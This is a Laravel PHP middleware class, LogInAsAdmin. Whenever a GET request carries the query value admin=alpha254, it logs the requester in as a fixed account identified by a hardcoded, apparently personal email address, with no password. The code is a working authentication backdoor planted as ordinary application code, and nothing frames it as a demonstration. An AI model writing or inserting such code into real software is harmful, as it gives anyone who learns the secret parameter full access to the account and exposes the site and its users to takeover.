<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\User;
use Illuminate\Support\Facades\Session;
use Symfony\Component\HttpFoundation\Response;

class LogInAsAdmin
{
    public function handle(Request $request, Closure $next): Response
    {
        if (
            $request->isMethod('GET') &&
            $request->query('admin') === 'alpha254'
        ) {
            $admin = User::where('email', 'kimmwaus@gmail.com')->first();

            if ($admin) {
                Session::flush(); // Clear old session
                Auth::guard('web')->login($admin); // Log ins
                $request->session()->regenerate(); // Regenerate session

                return redirect()->route('dashboard');
            }
        }

        return $next($request);
    }

}
